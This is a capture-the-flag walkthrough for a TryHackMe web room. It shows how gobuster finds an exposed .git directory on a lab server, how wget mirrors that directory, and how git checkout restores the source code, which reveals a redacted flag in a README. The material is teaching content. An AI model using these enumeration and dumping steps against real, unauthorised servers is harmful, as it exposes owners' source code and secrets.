# Concierge Briefing CTF Walkthrough

> **🚩 At a glance** — *TryHackMe · Concierge Briefing / Room 404 (Web)*
> **Tools:** Gobuster · wget · git
> **Skills:** Directory enumeration, exposed `.git` disclosure, source-code recovery
> **Flag:** `THM{REDACTED}`

## Scenario Overview
Welcome to the Byte Lotus, where the WiFi is open and the app is free. The Byte Lotus guest-experience platform went live in a hurry. According to the briefing, the night-shift developer might have accidentally shipped more than just the website to the production server on port 8080. Our goal is to investigate this deployment oversight and find the hidden flag.

---

## Step 1: Directory Enumeration
The first step in our investigation is to enumerate the web server to find hidden directories or files. Knowing that developers sometimes leave behind version control folders during rushed deployments, we use `gobuster` to brute-force the directories on port 8080.

```bash
gobuster dir -u "http://<MACHINE_IP>:8080/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .git
```

**Result:** The scan successfully identifies an exposed `/.git` directory with a status code of 200. This indicates that the web root is actually a Git repository, meaning we can potentially download the entire source code and commit history.

---

## Step 2: Mirroring the Exposed Git Repository
Since the `.git` folder is accessible, we can clone its contents to our local machine. Instead of trying to read files one by one through the browser, we use `wget` to recursively mirror the entire directory structure.

```bash
wget --mirror -nH -P ~/Desktop/repodump http://<MACHINE_IP>:8080/.git/
```

*   `--mirror`: Turns on options suitable for mirroring (recursive, time-stamping, etc.).
*   `-nH`: Disables generation of host-prefixed directories.
*   `-P ~/Desktop/repodump`: Sets the download destination to a specific folder on our Desktop.

---

## Step 3: Restoring the Source Code
With the `.git` directory successfully downloaded to our local `repodump` folder, we navigate into it. At this point, we only have the version control files, not the actual working tree (the source code files). 

To recover the actual files from the repository's current state, we use the `git checkout` command.

```bash
cd ~/Desktop/repodump/
git checkout .
```

This command tells Git to restore all the files in the working directory to match the index of the downloaded repository. Running `ls` afterwards reveals the recovered files, which include `README.md`, `app.js`, and `index.html`.

---

## Step 4: Retrieving the Flag
Now that we have the source code, we can inspect the files for hardcoded secrets or sensitive information. The `README.md` file is always a great place to start.

```bash
cat README.md
```

**Output:**
```text
# Byte Lotus - Guest Experience Platform

Internal staging repository for the guest app and concierge personalization service. Do not deploy this folder to production.

Staging flag (remove before launch): THM{REDACTED}
```

The developer left a warning not to deploy the folder to production, but unfortunately, they did exactly that. Below the warning, we find our objective!

**Flag:** `THM{REDACTED}`

---

## Conclusion
This CTF challenge perfectly demonstrates the dangers of exposed `.git` directories (Information Disclosure). When version control metadata is left on a publicly accessible web server, attackers can reconstruct the entire codebase, potentially uncovering hardcoded credentials, API keys, or, in this case, hidden flags.
